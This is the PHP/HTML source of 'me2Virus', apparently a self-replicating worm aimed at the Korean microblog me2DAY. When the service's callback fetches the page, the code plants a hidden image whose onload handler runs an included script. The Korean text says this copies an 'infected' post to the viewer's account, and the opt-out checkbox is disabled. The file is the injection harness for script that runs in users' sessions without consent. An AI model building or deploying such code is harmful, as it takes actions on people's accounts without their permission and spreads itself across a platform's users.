<?php
$callback = preg_match('{^me2DAY}', $_SERVER['HTTP_USER_AGENT']);
$enable = true;

if ($callback) $nonce = md5(microtime(true));
$dir = 'http://me2.subl.ee/me2virus';
function h($t) { return htmlspecialchars($t); }
?>

<? if (!$callback): ?>
  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
  <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ko">
  <head>
  <meta http-equiv="Content-Type"
        content="application/xhtml+xml; charset=UTF-8" />
  <meta name="author" content="Heungsub Lee" />
  <link rel="shortcut icon" type="images/ico" href="me2virus.ico" />
  <link rel="stylesheet" type="text/css" href="style.css" />
  <title>me2Virus</title>
  </head>
  <body>
<? endif ?>

<h1 style="border-bottom: 1px solid #ccc; min-width: 350px;">
  <a href="<?=h($dir) ?>" style="
    display: block; overflow: hidden;
    width: 145px; height: 50px; margin-bottom: 5px;
  "><img src="<?=h($dir) ?>/me2virus_chipset.gif" alt="me2Virus" /></a>
</h1>

<? if ($callback): ?>
  <? if ($enable): ?>
    <div style="float: right; margin-top: -2em; font-size: 11px;"
         class="me2virus-reject">
      <label><input type="checkbox" name="reject" disabled="disabled" />
      감염거부</label>
    </div>
    <p class="me2virus-host" style="padding-bottom: 1em;"></p>
    <p style="padding-bottom: 1em;" class="me2virus-message">
      이 콜백문서가 열리는 즉시 me2Virus는 당신의 미투데이에 감염된 포스팅을
      복제합니다. 그밖에는 어떠한 피해도 입히지 않습니다. 차후 감염을 거부하거나
      허용하기 위해서는 우측 상단의 &quot;감염거부&quot;
      체크박스를 이용해주세요.
    </p>
  <? else: ?>
    <p style="padding-bottom: 1em;" class="me2virus-message">
      미투바이러스가 바이러스에 감염되었습니다. 그동안 감사했어요^~^
    </p>
  <? endif ?>
<? else: ?>
  <? include dirname(__FILE__).'/dashboard.html' ?>
<? endif ?>

<? $_app = 'a1i'; include dirname(__FILE__).'/../me2/signature.html' ?>

<? if ($callback): ?>
  <? if (true): ?>
  <img src="http://img.subl.ee/hyuhsub.png" style="display: none;"
    id="--me2virus-script-<?=$nonce ?>--"
    onload="<? ob_start() ?>
      var script_id = '--me2virus-script-<?=$nonce ?>--';
      <? include dirname(__FILE__).'/script.js' ?>
    <?=h(ob_get_clean()) ?>" />
  <? endif ?>
<? else: ?>
  <script type="text/javascript" src="jquery-1.3.2.min.js"></script>
  <script type="text/javascript" src="jquery.color.js"></script>
  <script type="text/javascript" src="dashboard.js"></script>
  <? include '/home/sublee/www/subl.ee/sublee/templates/ga.html' ?>
  </body>
  </html>
<? endif ?>
